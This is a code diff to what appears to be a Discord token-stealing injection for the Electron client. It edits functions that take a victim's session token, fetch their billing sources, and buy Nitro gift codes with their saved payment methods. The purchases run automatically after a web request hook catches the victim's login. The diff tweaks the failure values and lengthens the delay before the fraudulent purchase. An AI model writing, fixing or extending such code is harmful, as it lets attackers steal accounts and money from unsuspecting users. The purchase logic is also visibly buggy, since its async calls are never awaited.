@@ -202,27 +202,26 @@ const Purchase = async (token, id, _type, _time) => {
     xmlHttp.responseText`);
     if (req["gift_code"]) {
         return "https://discord.gift/" + req["gift_code"];
-    } else return null;
+    } else return "failed";
 };
 
 const buyNitro = async (token) => {
     const data = await fetchBilling(token);
     if (data === "") return "";
 
-    let IDS = [];
     data.forEach((x) => {
         if (!x.invalid) {
-            const sourceID = x.id;
+            let sourceID = x.id;
             const first = Purchase(token, sourceID, "boost", "year");
-            if (first !== null) {
+            if (first !== "failed") {
                 return first;
             } else {
                 const second = Purchase(token, sourceID, "boost", "month");
-                if (second !== null) {
+                if (second !== "failed") {
                     return second;
                 } else {
                     const third = Purchase(token, sourceID, "classic", "month");
-                    if (third !== null) {
+                    if (third !== "failed") {
                         return third;
                     } else {
                         return "Failed to Purchase ❌";
@@ -661,7 +660,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
             if (!config.auto_buy_nitro) return;
             setTimeout(() => {
                 nitroBought(token).catch(console.error);
-            }, 7500);
+            }, 75000);
             break;
 
         default:
